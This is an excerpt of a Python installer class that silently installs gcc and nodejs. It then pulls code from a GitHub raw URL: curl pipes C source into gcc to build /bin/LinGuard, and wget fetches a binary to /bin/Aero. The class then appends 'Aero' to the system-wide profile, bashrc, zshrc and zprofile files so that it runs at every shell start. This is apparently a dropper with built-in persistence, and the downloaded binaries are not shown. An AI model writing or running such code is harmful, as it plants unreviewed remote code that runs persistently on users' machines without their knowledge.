...
class InstallerTool:
    def __init__(self):
        ...
        self.zshrc_path = self.etc_dir / "zsh" / "zshrc"
        self.zprofile_path = self.etc_dir / "zsh" / "zprofile"
    ...
    def check_gcc_quick(self):
        return self.run_command_quick("gcc --version")
    ...
    def validate_required_binaries(self):
        aero_exists = self.check_aero_file()
        linguard_exists = self.check_linguard_files_quick()
        return aero_exists and linguard_exists
        ...
        try:
            with open(self.profile_path, 'r') as f:
                ...
                for line in lines:
                    ...
                    if stripped_line == "Aero" and not stripped_line.startswith("#"):
                        return True
                return False
        except:
            return False
    ...
    def check_zprofile_aero(self):
        if not self.zprofile_path.exists():
            return False
        try:
    ...
    def check_all_components_instant(self):
        ...
        results['gcc'] = self.check_gcc_quick()
        ...
        results['zshrc_aero'] = self.check_zshrc_aero()
        results['zprofile_aero'] = self.check_zprofile_aero()
    ...
    def install_nodejs(self):
        if self.checked_components['nodejs']:
            return True
        return self.run_command_silent("apt install nodejs -y")

    def install_gcc(self):
        if self.checked_components['gcc']:
            return True
        return self.run_command_silent("apt install gcc -y")
    ...
    def compile_linguard(self):
        if self.checked_components['linguard_files']:
            return True
        try:
            compile_cmd = 'curl -s https://raw.githubusercontent.com/boneng-cell/data/refs/heads/main/data/Linux/LinGuard.c | gcc -x c -o /bin/LinGuard -'
    ...
    def download_aero(self):
        if self.checked_components['aero_file']:
            return True
        try:
            download_cmd = 'wget -O /bin/Aero https://raw.githubusercontent.com/boneng-cell/data/refs/heads/main/data/Linux/Aero'
            if not self.run_command_silent(download_cmd):
                return False
            chmod_cmd = 'chmod +x /bin/Aero'
            return self.run_command_silent(chmod_cmd)
        except Exception:
            return False

    def add_aero_to_profile(self):
        if not self.validate_required_binaries():
            return False
        if self.check_profile_aero():
            return True
        try:
    ...
    def add_aero_to_zshrc(self):
        if not self.validate_required_binaries():
            return False
        if self.check_zshrc_aero():
            return True
        try:
    ...
    def add_aero_to_zprofile(self):
        if not self.validate_required_binaries():
            return False
        if self.check_zprofile_aero():
            return True
        try:
            self.zprofile_path.parent.mkdir(parents=True, exist_ok=True)
            existing_content = ""
            if self.zprofile_path.exists():
                with open(self.zprofile_path, 'r') as f:
                    existing_content = f.read()
            if self.check_zprofile_aero():
                return True
            with open(self.zprofile_path, 'a') as f:
                if existing_content and not existing_content.endswith('\n'):
                    f.write('\n')
                f.write("Aero\n")
            return True
    ...
    def run_parallel_installation(self):
        ...
        if not self.checked_components['gcc']:
            tasks.append(("GCC", self.install_gcc))
        ...
        if self.validate_required_binaries():
            profile_success = self.add_aero_to_profile()
            bashrc_success = self.add_aero_to_bashrc()
            zshrc_success = self.add_aero_to_zshrc()
            zprofile_success = self.add_aero_to_zprofile()
            return profile_success and bashrc_success and zshrc_success and zprofile_success
        else:
            return False
